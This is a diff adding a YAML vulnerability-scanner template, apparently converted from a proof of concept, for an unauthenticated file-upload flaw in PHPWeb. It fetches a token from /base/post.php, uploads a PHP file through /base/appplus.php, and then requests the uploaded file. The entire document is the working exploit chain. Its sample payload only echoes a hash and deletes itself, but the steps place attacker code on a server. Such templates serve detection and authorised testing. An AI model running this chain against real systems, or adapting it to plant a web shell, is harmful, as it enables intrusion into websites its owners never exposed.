@@ -1,0 +1,59 @@
+id: yaml-poc-phpweb-phpweb-file_upload-CT-416589
+info:
+  name: Yaml Poc Phpweb Phpweb File_Upload Ct 416589
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-phpweb-phpweb-file_upload-CT-416589'
+  tags: fileupload
+  reference: []
+http:
+- method: POST
+  path:
+  - /base/post.php
+  body: act=appcode
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - k=
+    - t=
+- method: POST
+  path:
+  - /base/appplus.php
+  body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+    \ name=\"file\"; filename=\"{{randname}}.php\"\r\nContent-Type: application/octet-stream\r\
+    \n\r\n<?php echo md5({{f1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}\r\
+    \nContent-Disposition: form-data; name=\"act\"\r\n\nupload\r\n------WebKitFormBoundary{{rboundary}}\r\
+    \nContent-Disposition: form-data; name=\"r_size\"\r\n\n41\r\n------WebKitFormBoundary{{rboundary}}\r\
+    \nContent-Disposition: form-data; name=\"t\"\r\n\n{{token}}\r\n------WebKitFormBoundary{{rboundary}}\r\
+    \nContent-Disposition: form-data; name=\"m\"\r\n\n{{md}}\r\n------WebKitFormBoundary{{rboundary}}\r\
+    \nContent-Disposition: form-data; name=\"path\"\r\n\nupload\r\n------WebKitFormBoundary{{rboundary}}--\r\
+    \n"
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - .php
+- method: GET
+  path:
+  - /upload/{{fname}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
